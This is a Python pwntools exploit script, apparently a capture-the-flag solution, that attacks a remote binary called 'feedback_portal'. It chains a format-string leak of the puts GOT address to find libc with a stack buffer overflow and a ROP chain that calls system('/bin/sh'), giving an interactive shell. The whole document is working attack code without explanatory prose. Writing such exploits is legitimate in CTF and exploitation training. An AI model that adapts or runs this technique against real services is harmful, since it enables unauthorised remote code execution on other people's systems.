#!/usr/bin/env python3
from pwn import *

ADDR = "offsec.m0lecon.it"
PORT = 13600

context.binary = elf = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, PORT)
    return r

# --- Constants ---
OFFSET_TO_RIP  = 136          # offset from feedback[] base to saved RIP
PRINTF_IDX     = 14           # base index of name buffer on printf's stack
PUTS_GOT       = elf.got['puts']   # fixed address (no PIE)

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

r = conn()

# ── Stage 1: Format string leak ──────────────────────────────────────────────
r.recvuntil(b"name:\n")
# %15$s dereferences the GOT pointer appended at the end of the buffer
r.sendline(f"%{PRINTF_IDX + 1}$sAAA".encode() + p64(PUTS_GOT))

leak = r.recvline().strip().split(b"AAA")[0].split(b"Hello, ")[1]
puts_addr = u64(leak.ljust(8, b'\x00'))
log.info(f"puts @ {puts_addr:#x}")

libc.address = puts_addr - libc.symbols['puts']
log.info(f"libc base @ {libc.address:#x}")

# ── Stage 2: ROP chain → system("/bin/sh") ───────────────────────────────────
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
binsh   = next(libc.search(b'/bin/sh\x00'))
system  = libc.symbols['system']

r.recvuntil(b'feedback:\n')
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),     # stack alignment
    p64(pop_rdi),        # pop rdi; ret
    p64(binsh),          # rdi = "/bin/sh"
    p64(system),         # system("/bin/sh")
)
r.send(payload)
r.interactive()